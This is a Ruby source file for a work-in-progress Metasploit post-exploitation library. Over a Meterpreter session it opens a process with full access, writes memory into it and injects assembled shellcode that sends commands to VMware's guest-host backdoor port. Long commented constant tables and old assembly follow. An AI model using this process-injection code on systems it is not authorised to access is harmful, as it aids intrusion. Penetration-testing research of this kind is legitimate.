require 'msf/core/post/vmware/vmware_backdoor_constants'

module Msf::Post::Vmware
  include Msf::Post::Windows::Process
  include Msf::Post::Vmware::Constants

  ##
  ## WARNING
  ## 
  ## This is very much an unstable work in progress and is presented for 
  ## demonstration purposes only. It is currently not considered "production-ready" 
  ## for inclusion in the Metasploit Framework. For example, this code results
  ## in a memory leak on the targeted process. This is a known issue. Attempts
  ## to free the allocated memory currently result in a timeout condition.
  ##
  ## Once it is stable, a pull request will be created. 
  ##
  ## WARNING
  ##

  # if testing:
  # $cp vmware.rb metasploit-framework/lib/msf/core/post/vmware.rb
  # and either edit metasploit-framework/lib/msf/core/post.rb to require vmware.rb
  # AND/OR
  # irb> Kernel.load "metasploit-framework/lib/msf/core/post/vmware.rb"

  #module Backdoor
    # TODO: To be converted to objects like Vmware::Backdoor::Command.new(bd_cmd)
    # TODO: instead of plain integer constants, BDOOR_CMD_ references should
    #  represent a hash or objects similar to the following so callers can just do
    #  send_bd_cmd("BDOOR_CMD_GETNEXTPIECE", len) vs also including :eax & String
    # backdoor_commands_available = {
    # "BDOOR_CMD_GETSELLENGTH" => {val: 0x6, reg: ax,  ret_type: :int16},
    # "BDOOR_CMD_GETNEXTPIECE" => {val: 0x7, reg: eax, ret_type: :string},
    # ...
    # }

    #
    # Primary public interface to send Backdoor commands
    #

    # e.g. len = send_bd_cmd(BDOOR_CMD_GETSELLENGTH, :ax)
    # e.g. send_bd_cmd(BDOOR_CMD_GETNEXTPIECE, :eax, len, String)
    def send_bd_cmd(bd_cmd, reg = nil, len = nil, klass = nil, close = true,
                    pid = session.sys.process.getpid)
      vprint_status("Sending Backdoor command #{bd_cmd}")
      vprint_status "VMware lib received send_bd_cmd=(#{bd_cmd}, klass=#{klass}, " +
                    "close=#{close}, pid=#{pid})"
      vprint_status "Opening process #{pid}"
      tgt_process = session.sys.process.open(pid, PROCESS_ALL_ACCESS)
      vprint_status "Passing to bd_send"
      case reg
      when :ax
        from_reg = 'ax'
        read_len = len || 2
        alignment = 2
      when :eax
        from_reg = 'eax'
        read_len = len || 4
        alignment = 4
      else
        from_reg = reg
        read_len = len
        alignment = 2
      end
      vprint_status("Sending #{bd_cmd}, #{from_reg}, #{read_len}, #{alignment}, " +
                    "#{klass}, #{close} to bd_send")
      bd_send(bd_cmd, from_reg, read_len, alignment, klass, close, tgt_process)
    end

    # TODO: This is going to be used once the bindata backdoor_proto struct is
    #  working properly. Where bp = Vmware::Backdoor::BackdoorProto.new
    #  and the command is an object (see comment on send_bd_cmd)
    # def send_bd_struct!(bp)
    #   TODO: Update this
    #   @assembly << asm_preamble
    #   @assembly << "mov edi, #{bp.dst_addr}"
    #   @assembly << "mov esi, #{bp.src_addr}"
    #   @assembly << "mov edx, #{bp.port}"
    #   @assembly << "mov ecx, #{bp.cmd_msg}"
    #   @assembly << "mov ebx, #{bp.cmd_param}"
    #   @assembly << "mov eax, #{bp.magic}"
    #   @assembly << "in eax, dx"
    #   @assembly << asm_prologue
    # end

    def read_and_format(tgt_process, read_ptr, read_len, klass = nil)
      vprint_status("read_and_format received read_ptr:#{read_ptr}, " +
                    "read_len:#{read_len}, klass:#{klass.class}:#{klass}")
      if klass == String
        format_str = nil
      elsif read_len > 2
        format_str = 'V*'
      elsif read_len == 2
        # just to be explicit
        format_str = 's<'
      else
        # TODO support other types as needed?
        format_str = 's<'
      end
      vprint_status("read_and_format is using format_str:#{format_str} and " + 
                    "read_len is #{read_len}")
      bin_str = tgt_process.memory.read(read_ptr, read_len)
      if bin_str
        vprint_status("Reading from memory returns #{bin_str.class}:#{bin_str}")
        ret = bin_str
        if format_str
          ret = ret.unpack(format_str).first
        end
        if klass == String
          vprint_status("klass is #{klass}, class of ret is #{ret.class}, " +
                        "format_str is (#{format_str.to_s})")
          vprint_status("read_and format is returning:(#{ret})")
        else
          ret = ret.to_i
          vprint_status("read_and_format is returning an int:(#{ret})")
        end
        ret
      else
        print_error("Could not read return value back from host memory")
        nil
      end
      ret
    end

    def bd_send(bd_cmd, from_reg, read_len, alignment, klass, close, tgt_process)
      vprint_status("bd_send received bd_cmd:#{bd_cmd}, from_reg:#{from_reg}, " +
                    "read_len:#{read_len}, align:#{alignment}, klass:#{klass}")
      read_ptr = nil
      adj_read_len = read_len = read_len.to_i 
      if read_len > 0
        adj_read_len = byte_align_len(read_len, alignment)
        # TODO: should we "memset" the buffer?
        # TODO: figure out how to free this mem. The free method seems to hang
        read_ptr = allocate_buffer_on_target(adj_read_len, tgt_process)
        vprint_status("read_ptr is #{hexify(read_ptr)}")
      end

      vprint_status("Generating assembly string")
      # bd_cmd, read_ptr = nil, read_len = 2, from_reg = 'ax', close = true
      asm = asm_send_bd_cmd(bd_cmd, read_ptr, adj_read_len, from_reg, close)
      vprint_status(asm)
      vprint_status("Preparing  assembly")
      thread = execute_asm(asm)
      # TODO: this is a Rex::Post::Meterpreter::Extensions::Stdapi::Sys::Thread
      # which represents a thread on the remote host and as such we have limited
      # insight, but we can do better, esp closing them properly and freeing mem
      # https://github.com/rapid7/metasploit-framework/blob/master/lib/rex/post/meterpreter/extensions/stdapi/sys/thread.rb
      # we should take more advantage of some of the thread methods
      if thread
        # once ax is no longer BDOOR_MAGIC, the thread has completed if simple query
        # while thread.query_regs['eax'] == BDOOR_MAGIC
        #   sleep 0.2
        # end
        #thread.close
        vprint_status("Backdoor command sent")
        vprint_status("Attemping to read return value from #{hexify(read_ptr)} " +
                      "of len #{read_len} as type #{klass}")
        read_and_format(tgt_process, read_ptr, read_len, klass)
      else
        nil
      end
    end

    #module Rpc

    def send_rpc_cmd(rpc_cmd_str, close = true, pid = session.sys.process.getpid)
      vprint_status("Sending RPC command #{rpc_cmd_str}")
      if rpc_cmd_str.blank?
        print_error("send_rpc_cmd must be passed a non-zero-length string")
        nil
      else
        vprint_status "VMware lib received send_rpc_cmd=(#{rpc_cmd_str}, " +
                      "close=#{close}, pid=#{pid})"
        vprint_status "Opening process #{pid}"
        tgt_process = session.sys.process.open(pid, PROCESS_ALL_ACCESS)
        vprint_status "Passing to rpc_send"
        rpc_send(rpc_cmd_str, close, 0, tgt_process)
      end
    end

    def rpc_send(rpc_cmd, close, read_len, tgt_process)
      bd_send(rpc_cmd, close, read_len, tgt_process)
    end

    #end # end Rpc

  #end # end Backdoor

  # allocates a buffer in memory in the tgt_process, of length data.length, then
  # writes 'data' to that buffer and returns the pointer to the buffer and number
  # of bytes written as an array [ptr, bytes], or nil on fail. Unlike
  # write_buffer_on_target, this method will try to mark the buffer as writable
  # if necessary
  # Note1: tgt_process should already be opened for writing with something like
  #  tgt_process = session.sys.process.open(pid, PROCESS_ALL_ACCESS)
  # Note2: don't forget to free this memory if need be
  def allocate_and_write_buffer_on_target(data, tgt_process)
    data_length = data.length
    if data_length > 0
      ptr = allocate_buffer_on_target(data_length, tgt_process)
      unless tgt_process.memory.writable?(ptr)
        tgt_process.memory.protect(ptr, data_length, PAGE_READWRITE)
        # TODO: check return?  the protect return is platform specific?
        unless tgt_process.memory.writable?(ptr)
          print_error("RPC command buffer could not be marked writable, freeing")
          tgt_process.memory.free(ptr, data_length)
          raise RuntimeError.new("TODO: memory can't be marked writable")
        end
      end
      # memory.write and thus write_buffer_on_target returns num of bytes written
      bytes = write_buffer_on_target(ptr, data, tgt_process)
      [ptr, bytes]
    else
      nil
    end
  end

  # byte align the allocation length to however big a chunk we are going to use
  def byte_align_len(len, alignment)
    vprint_status("byte_align_len is aligning #{len} to a #{alignment} byte boundary")
    adj_len = len = len.to_i
    rem = len % alignment
    if rem != 0
      adj_len = len + alignment - rem
    end
    adj_len
  end

  def allocate_buffer_on_target(len, tgt_process)
    vprint_status("Allocating (#{len}) bytes in (#{tgt_process.name}:#{tgt_process.pid})")
    ptr = tgt_process.memory.allocate(len)
    # TODO: A better error
    fail_with("Unable to allocate memory, is the process marked writable?") unless ptr 
    ptr
  end

  def write_buffer_on_target(ptr, data, tgt_process)
    tgt_process.memory.write(ptr, data)
  end

  def execute_asm(asm_str, arch = session.native_arch)
    # arch = ARCH_X64, ARCH_X86 etc
    cpu = case arch
    when ARCH_X86    then Metasm::Ia32.new
    when ARCH_X64    then Metasm::X86_64.new
    when ARCH_PPC    then Metasm::PowerPC.new
    when ARCH_ARMLE  then Metasm::ARM.new
    when ARCH_MIPSLE then Metasm::MIPS.new(:little)
    when ARCH_MIPSBE then Metasm::MIPS.new(:big)
    else
      raise RuntimeError.new("Metasm CPU could not be determined from architecture (#{arch})")
    end

    begin
      vprint_status("Assembling shellcode for #{arch}")
      sc = Metasm::Shellcode.assemble(cpu, asm_str)
      vprint_status("Shellcode has CPU:#{sc.cpu}")
      raw = sc.encoded.data
      vprint_status("Executing shellcode")
      # Post::Windows::Process.execute_shellcode injects current process by default
      thread = execute_shellcode(raw)
      if thread
        vprint_status "Thread is running"
        return thread
      else
        fail_with("Unable to create thread to execute shellcode")
      end
    rescue Rex::Post::Meterpreter::RequestError => e
      print_error("Unable to inject Backdoor shellcode:")
      raise
    end
    nil
  end

  def hexify(num)
    "0x#{num.to_s(16)}"
  end

  def asm_preamble
    %Q^
      #{datastore['DEBUG'] ? 'int 3' : ''}
      pusha^
  end

  def asm_cmd(cmd_msg, cmd_param = nil, cmd_ptr = nil, port = BDOOR_PORT)
    # TODO: do we know if this HB_PORT is always true based on cmd_param?
    # Typically we just trigger the backdoor w/the 'in' instr
    # But, when we want make use of a pointer to a buffer, we use the 'out'
    # instr to byte copy it using esi as the source ptr, and use the HB port
    vprint_status("asm_cmd received: cmd_msg:#{cmd_msg.class}:#{hexify(cmd_msg)}")

    asm = %Q^
      mov eax,#{hexify(BDOOR_MAGIC)}
      mov ecx,#{hexify(cmd_msg)}^
    if cmd_param == MESSAGE_TYPE_SENDSIZE && cmd_ptr
      # were' sending a buffer
      port = BDOORHB_PORT
      asm << %Q^
      mov ebx,#{hexify(cmd_param)}
      mov ebp,esi
      mov dx, #{hexify(port)}
      mov esi,#{hexify(cmd_ptr)}
      cld
      rep outsb^
    #TODO check if cmd_msg has been or'd with MESSAGE_TYPE_CLOSE instead
    #elsif cmd_param == MESSAGE_TYPE_CLOSE
    elsif cmd_msg & MESSAGE_TYPE_CLOSE == MESSAGE_TYPE_CLOSE # or != 0
      # this is a buffer close
      asm << %Q^
      mov dx, #{hexify(port)}
      mov esi, ebp
      in eax, dx^ 
    else
      # this is a typical command
      asm << %Q^
      mov dx, #{hexify(port)}
      mov ebx,#{cmd_param ? hexify(cmd_param) : 0}
      in eax,dx^
    end
    asm
  end

  def asm_read_from_io_port_into(cmd_msg, ptr_on_target = nil, read_size = 2, from_reg = 'ax')
    # adj_read_len = byte_align_len(read_len)
    chunk_size = from_reg == 'ax' ? 2 : 4
    vprint_good("Reading #{hexify(read_size)} from #{from_reg} with chunk_size #{chunk_size}")
    %Q^
      mov ebx, #{hexify(read_size)}
      mov esi, #{hexify(ptr_on_target)}
      mov ecx, #{hexify(cmd_msg)}
      mov edx, #{BDOOR_PORT}
      jmp bottom
      myloop:
      mov eax, #{hexify(BDOOR_MAGIC)}
      in eax,dx
      #{datastore['DEBUG'] ? 'int 3' : ''}
      mov [esi], #{from_reg}
      sub ebx, #{hexify(chunk_size)}
      add esi, #{hexify(chunk_size)}
      bottom:
      cmp ebx, 0
      jg myloop     ; jump if greater, signed^
  end

  def asm_rpc_close_backdoor
    # %Q^
    # mov eax,#{hexify(BDOOR_MAGIC)}
    # mov ecx,#{BDOOR_CMD_MESSAGE|MESSAGE_TYPE_CLOSE}
    # mov dx, #{BDOOR_PORT}
    # mov esi,ebp
    # in  eax,dx^
    asm_cmd(BDOOR_CMD_MESSAGE|MESSAGE_TYPE_CLOSE)
  end

  # command-number 
  # command-specific-param
  def asm_send_bd_cmd(bd_cmd, read_ptr = nil, read_len = 2, from_reg = 'ax', close = true)
    vprint_status("asm_send_bd_cmd received: bd_cmd:#{bd_cmd.class}:#{bd_cmd.to_s}")
    %Q^
      #{asm_preamble}
      #{asm_read_from_io_port_into(bd_cmd, read_ptr, read_len, from_reg)}
      #{asm_prologue}^
  end

  def asm_send_rpc_cmd(rpc_cmd_ptr, rpc_cmd_len, read_len, close = true)
    %Q^
      #{asm_preamble}
      #{asm_cmd(BDOOR_CMD_MESSAGE, RPCI_PROTOCOL_NUM|GUESTMSG_FLAG_COOKIE)}
      #{asm_cmd(BDOOR_CMD_MESSAGE|MESSAGE_TYPE_SENDSIZE, rpc_cmd_len)}
      #{asm_cmd(rpc_cmd_len, MESSAGE_TYPE_SENDSIZE, rpc_cmd_ptr)}
      #{close ? asm_rpc_close_backdoor : ''}
      #{asm_prologue}^
  end

  def asm_prologue
    %Q^
      popa
      ret^
  end

  # # from backdoor_def.h
  # BDOOR_MAGIC                         = 0x564D5868

  # # Low-bandwidth backdoor port
  # BDOOR_PORT                          = 0x5658

  # # High-bandwidth backdoor port*/
  # BDOORHB_PORT                        = 0x5659
  # BDOORHB_CMD_MESSAGE                 = 0
  # BDOORHB_CMD_VASSERT                 = 1
  # BDOORHB_CMD_MAX                     = 2

  # BDOOR_CMD_GETMHZ                    =   1
  # BDOOR_CMD_APMFUNCTION               =   2 # CPL= 0 only.
  # BDOOR_CMD_GETDISKGEO                =   3
  # BDOOR_CMD_GETPTRLOCATION            =   4
  # BDOOR_CMD_SETPTRLOCATION            =   5
  # BDOOR_CMD_GETSELLENGTH              =   6
  # BDOOR_CMD_GETNEXTPIECE              =   7
  # BDOOR_CMD_SETSELLENGTH              =   8
  # BDOOR_CMD_SETNEXTPIECE              =   9
  # BDOOR_CMD_GETVERSION                =  10
  # BDOOR_CMD_GETDEVICELISTELEMENT      =  11
  # BDOOR_CMD_TOGGLEDEVICE              =  12
  # BDOOR_CMD_GETGUIOPTIONS             =  13
  # BDOOR_CMD_SETGUIOPTIONS             =  14
  # BDOOR_CMD_GETSCREENSIZE             =  15
  # BDOOR_CMD_MONITOR_CONTROL           =  16 # Disabled by default.
  # BDOOR_CMD_GETHWVERSION              =  17
  # BDOOR_CMD_OSNOTFOUND                =  18 # CPL= 0 only.
  # BDOOR_CMD_GETUUID                   =  19
  # BDOOR_CMD_GETMEMSIZE                =  20
  # BDOOR_CMD_HOSTCOPY                  =  21 # Devel only.

  # BDOOR_CMD_GETTIME                   =  23 # Deprecated -> GETTIMEFULL.
  # BDOOR_CMD_STOPCATCHUP               =  24
  # BDOOR_CMD_PUTCHR                    =  25 # Disabled by default.
  # BDOOR_CMD_ENABLE_MSG                =  26 # Devel only.
  # BDOOR_CMD_GOTO_TCL                  =  27 # Devel only.
  # BDOOR_CMD_INITPCIOPROM              =  28 # CPL = 0 only.

  # BDOOR_CMD_MESSAGE                   =  30 # 0x1e
  # BDOOR_CMD_SIDT                      =  31
  # BDOOR_CMD_SGDT                      =  32
  # BDOOR_CMD_SLDT_STR                  =  33
  # BDOOR_CMD_ISACPIDISABLED            =  34

  # BDOOR_CMD_ISMOUSEABSOLUTE           =  36
  # BDOOR_CMD_PATCH_SMBIOS_STRUCTS      =  37 # CPL = 0 only.
  # BDOOR_CMD_MAPMEM                    =  38 # Devel only
  # BDOOR_CMD_ABSPOINTER_DATA           =  39
  # BDOOR_CMD_ABSPOINTER_STATUS         =  40
  # BDOOR_CMD_ABSPOINTER_COMMAND        =  41

  # BDOOR_CMD_PATCH_ACPI_TABLES         =  43 # CPL = 0 only.

  # BDOOR_CMD_GETHZ                     =  45
  # BDOOR_CMD_GETTIMEFULL               =  46

  # BDOOR_CMD_CHECKFORCEBIOSSETUP       =  48 # CPL = 0 only.
  # BDOOR_CMD_LAZYTIMEREMULATION        =  49 # CPL = 0 only.
  # BDOOR_CMD_BIOSBBS                   =  50 # CPL = 0 only.

  # BDOOR_CMD_ISGOSDARWIN               =  52
  # BDOOR_CMD_DEBUGEVENT                =  53
  # BDOOR_CMD_OSNOTMACOSXSERVER         =  54 # CPL = 0 only.
  # BDOOR_CMD_GETTIMEFULL_WITH_LAG      =  55
  # BDOOR_CMD_ACPI_HOTPLUG_DEVICE       =  56 # Devel only.
  # BDOOR_CMD_ACPI_HOTPLUG_MEMORY       =  57 # Devel only.
  # BDOOR_CMD_ACPI_HOTPLUG_CBRET        =  58 # Devel only.

  # BDOOR_CMD_ACPI_HOTPLUG_CPU          =  60 # Devel only.

  # BDOOR_CMD_XPMODE                    =  62 # CPL = 0 only.
  # BDOOR_CMD_NESTING_CONTROL           =  63
  # BDOOR_CMD_FIRMWARE_INIT             =  64 # CPL = 0 only.
  # BDOOR_CMD_FIRMWARE_ACPI_SERVICES    =  65 # CPL = 0 only.
  # BDOOR_CMD_FAS_GET_TABLE_SIZE        =   0
  # BDOOR_CMD_FAS_GET_TABLE_DATA        =   1
  # BDOOR_CMD_FAS_GET_PLATFORM_NAME     =   2
  # BDOOR_CMD_FAS_GET_PCIE_OSC_MASK     =   3
  # BDOOR_CMD_FAS_GET_APIC_ROUTING      =   4
  # BDOOR_CMD_FAS_GET_TABLE_SKIP        =   5
  # BDOOR_CMD_FAS_GET_SLEEP_ENABLES     =   6
  # BDOOR_CMD_FAS_GET_HARD_RESET_ENABLE =   7
  # BDOOR_CMD_FAS_GET_MOUSE_HID         =   8
  # BDOOR_CMD_FAS_GET_SMBIOS_VERSION    =   9
  # BDOOR_CMD_SENDPSHAREHINTS           =  66 # Not in use. Deprecated.
  # BDOOR_CMD_ENABLE_USB_MOUSE          =  67
  # BDOOR_CMD_GET_VCPU_INFO             =  68
  # BDOOR_CMD_VCPU_SLC64                =   0
  # BDOOR_CMD_VCPU_SYNC_VTSCS           =   1
  # BDOOR_CMD_VCPU_HV_REPLAY_OK         =   2
  # BDOOR_CMD_VCPU_LEGACY_X2APIC_OK     =   3
  # BDOOR_CMD_VCPU_MMIO_HONORS_PAT      =   4
  # BDOOR_CMD_VCPU_RESERVED             =  31
  # BDOOR_CMD_EFI_SERIALCON_CONFIG      =  69 # CPL = 0 only.
  # BDOOR_CMD_BUG328986                 =  70 # CPL = 0 only.
  # BDOOR_CMD_FIRMWARE_ERROR            =  71 # CPL = 0 only.
  # BDOOR_CMD_FE_INSUFFICIENT_MEM       =   0
  # BDOOR_CMD_FE_EXCEPTION              =   1
  # BDOOR_CMD_VMK_INFO                  =  72
  # BDOOR_CMD_EFI_BOOT_CONFIG           =  73 # CPL = 0 only.
  # BDOOR_CMD_EBC_LEGACYBOOT_ENABLED        = 0
  # BDOOR_CMD_EBC_GET_ORDER                 = 1
  # BDOOR_CMD_EBC_SHELL_ACTIVE              = 2
  # BDOOR_CMD_EBC_GET_NETWORK_BOOT_PROTOCOL = 3
  # BDOOR_CMD_EBC_QUICKBOOT_ENABLED         = 4
  # BDOOR_CMD_GET_HW_MODEL              =  74 # CPL = 0 only.
  # BDOOR_CMD_GET_SVGA_CAPABILITIES     =  75 # CPL = 0 only.
  # BDOOR_CMD_GET_FORCE_X2APIC          =  76 # CPL = 0 only
  # BDOOR_CMD_SET_PCI_HOLE              =  77 # CPL = 0 only
  # BDOOR_CMD_GET_PCI_HOLE              =  78 # CPL = 0 only
  # BDOOR_CMD_GET_PCI_BAR               =  79 # CPL = 0 only
  # BDOOR_CMD_SHOULD_GENERATE_SYSTEMID  =  80 # CPL = 0 only
  # BDOOR_CMD_READ_DEBUG_FILE           =  81 # Devel only.
  # BDOOR_CMD_SCREENSHOT                =  82 # Devel only.
  # BDOOR_CMD_INJECT_KEY                =  83 # Devel only.
  # BDOOR_CMD_INJECT_MOUSE              =  84 # Devel only.
  # BDOOR_CMD_MKS_GUEST_STATS           =  85 # CPL = 0 only.
  # BDOOR_CMD_MKSGS_RESET               =   0
  # BDOOR_CMD_MKSGS_ADD_PPN             =   1
  # BDOOR_CMD_MKSGS_REMOVE_PPN          =   2
  # BDOOR_CMD_ABSPOINTER_RESTRICT       =  86
  # BDOOR_CMD_GUEST_INTEGRITY           =  87
  # BDOOR_CMD_GI_GET_CAPABILITIES       =   0
  # BDOOR_CMD_GI_SETUP_ENTRY_POINT      =   1
  # BDOOR_CMD_GI_SETUP_ALERTS           =   2
  # BDOOR_CMD_GI_SETUP_STORE            =   3
  # BDOOR_CMD_GI_SETUP_EVENT_RING       =   4
  # BDOOR_CMD_GI_SETUP_NON_FAULT_READ   =   5
  # BDOOR_CMD_GI_ENTER_INTEGRITY_MODE   =   6
  # BDOOR_CMD_GI_EXIT_INTEGRITY_MODE    =   7
  # BDOOR_CMD_GI_RESET_INTEGRITY_MODE   =   8
  # BDOOR_CMD_GI_GET_EVENT_RING_STATE   =   9
  # BDOOR_CMD_GI_CONSUME_RING_EVENTS    =  10
  # BDOOR_CMD_GI_WATCH_MAPPINGS_START   =  11
  # BDOOR_CMD_GI_WATCH_MAPPINGS_STOP    =  12
  # BDOOR_CMD_GI_CHECK_MAPPINGS_NOW     =  13
  # BDOOR_CMD_GI_WATCH_PPNS_START       =  14
  # BDOOR_CMD_GI_WATCH_PPNS_STOP        =  15
  # BDOOR_CMD_GI_SEND_MSG               =  16
  # BDOOR_CMD_GI_TEST_READ_MOB          = 128
  # BDOOR_CMD_GI_TEST_ADD_EVENT         = 129
  # BDOOR_CMD_GI_TEST_MAPPING           = 130
  # BDOOR_CMD_GI_TEST_PPN               = 131
  # BDOOR_CMD_GI_MAX                    = 131
  # BDOOR_CMD_MKSSTATS_SNAPSHOT         =  88 # Devel only.
  # BDOOR_CMD_MKSSTATS_START            =   0
  # BDOOR_CMD_MKSSTATS_STOP             =   1
  # BDOOR_CMD_SECUREBOOT                =  89
  # BDOOR_CMD_COPY_PHYSMEM              =  90 # Devel only.
  # BDOOR_CMD_MAX                       =  91

  # # from various other sources in open_vm_tools
  # RPCI_PROTOCOL_NUM                   = 0x49435052 # 'RPCI'
  # GUESTMSG_FLAG_COOKIE                = 0x80000000
  # MESSAGE_TYPE_SENDSIZE               = 0x10000
  # MESSAGE_TYPE_CLOSE                  = 0x60000

#    MESSAGE_TYPE_OPEN,
#    MESSAGE_TYPE_SENDSIZE,
#    MESSAGE_TYPE_SENDPAYLOAD,
#    MESSAGE_TYPE_RECVSIZE,
#    MESSAGE_TYPE_RECVPAYLOAD,
#    MESSAGE_TYPE_RECVSTATUS,
#    MESSAGE_TYPE_CLOSE,

  # # Nesting control operations 
  # NESTING_CONTROL_RESTRICT_BACKDOOR     = 0
  # NESTING_CONTROL_OPEN_BACKDOOR         = 1
  # NESTING_CONTROL_QUERY                 = 2
  # NESTING_CONTROL_MAX                   = 2

  # # EFI Boot Order options, nibble-sized. 
  # EFI_BOOT_ORDER_TYPE_EFI               = 0x0
  # EFI_BOOT_ORDER_TYPE_LEGACY            = 0x1
  # EFI_BOOT_ORDER_TYPE_NONE              = 0xf

  # BDOOR_NETWORK_BOOT_PROTOCOL_NONE      = 0x0
  # BDOOR_NETWORK_BOOT_PROTOCOL_IPV4      = 0x1
  # BDOOR_NETWORK_BOOT_PROTOCOL_IPV6      = 0x2

  # #BDOOR_SECUREBOOT_STATUS_DISABLED      = 0xFFFFFFFFUL
  # BDOOR_SECUREBOOT_STATUS_APPROVED      = 1
  # BDOOR_SECUREBOOT_STATUS_DENIED        = 2

  # #
  # # There is another backdoor which allows access to certain TSC-related
  # # values using otherwise illegal PMC indices when the pseudo_perfctr
  # # control flag is set.
  # BDOOR_PMC_HW_TSC          = 0x10000
  # BDOOR_PMC_REAL_NS         = 0x10001
  # BDOOR_PMC_APPARENT_NS     = 0x10002
  # BDOOR_PMC_PSEUDO_TSC      = 0x10003

  # #IS_BDOOR_PMC(index)  (((index) | 3) == 0x10003)
  # #BDOOR_CMD(ecx)       ((ecx) & 0xffff)

  # # Sub commands for BDOOR_CMD_VMK_INFO 
  # BDOOR_CMD_VMK_INFO_ENTRY       = 1


end # end Vmware module

# look at Message_OpenAllocated in ./open-vm-tools/lib/message/message.c
# flags = GUESTMSG_FLAG_COOKIE;
# retry:
#    / IN: Type /
#    bp.in.cx.halfs.high = MESSAGE_TYPE_OPEN;
#    / IN: Magic number of the protocol and flags /
#    bp.in.size = proto | flags;
# GUESTMSG_FLAG_COOKIE in ./open-vm-tools/lib/include/guest_msg_def.h:

# #define GUESTMSG_FLAG_COOKIE 0x80000000

# MessageType in ./open-vm-tools/lib/include/guest_msg_def.h:
# typedef enum {
#    MESSAGE_TYPE_OPEN,
#    MESSAGE_TYPE_SENDSIZE,
#    MESSAGE_TYPE_SENDPAYLOAD,
#    MESSAGE_TYPE_RECVSIZE,
#    MESSAGE_TYPE_RECVPAYLOAD,
#    MESSAGE_TYPE_RECVSTATUS,
#    MESSAGE_TYPE_CLOSE,
# } MessageType;
# bp.in.cx.halfs.high = MESSAGE_TYPE_OPEN;
#    / IN: Magic number of the protocol and flags /
#    bp.in.size = proto | flags;

#    bp.in.cx.halfs.low = BDOOR_CMD_MESSAGE;
# high half is MessageType, so 1 is MESSAGE_TYPE_SENDSIZE and 6 is MESSAGE_TYPE_CLOSE

# original
          # rpc_asm = %Q^
##Preamble
          #         #{datastore['DEBUG'] ? 'int 3' : ''}
          #         pusha
##RPC_proto
          #         mov    eax,0x564d5868
          #         mov    ecx,0x1e
          #         mov    edx,0x5658
          #         mov    ebx,0xc9435052
          #         in     eax,dx
##SendSize
          #         mov    eax,0x564d5868
          #         mov    ecx,0x1001e
          #         mov    dx,0x5658
          #         mov    ebx,#{hexify(rpc_cmd_len)}
          #         in     eax,dx
##Buffer
          #         mov    eax,0x564d5868
          #         mov    ecx,#{hexify(rpc_cmd_len)}
          #         mov    ebx,0x10000
          #         mov    ebp,esi
          #         mov    dx,0x5659
          #         mov    esi,#{hexify(rpc_cmd_ptr)}
          #         cld
          #         rep    outsb
##Close
          #         mov    eax,0x564d5868
          #         mov    ecx,0x6001e
          #         mov    dx,0x5658
          #         mov    esi,ebp
          #         in     eax,dx
##Prologue
          #         popa
          #         ret
          #       ^
          # unclose_asm = %Q^
          #         #{datastore['DEBUG'] ? 'int 3' : ''}
          #         pusha
          #         mov    eax,0x564d5868
          #         mov    ecx,0x1e
          #         mov    edx,0x5658
          #         mov    ebx,0xc9435052
          #         in     eax,dx
          #         mov    eax,0x564d5868
          #         mov    ecx,0x1001e
          #         mov    dx,0x5658
          #         mov    ebx,#{hexify(rpc_cmd_len)}
          #         in     eax,dx
          #         mov    eax,0x564d5868
          #         mov    ecx,#{hexify(rpc_cmd_len)}
          #         mov    ebx,0x10000
          #         mov    ebp,esi
          #         mov    dx,0x5659
          #         mov    esi,#{hexify(rpc_cmd_ptr)}
          #         cld
          #         rep    outsb
          #         popa
          #         ret
          #       ^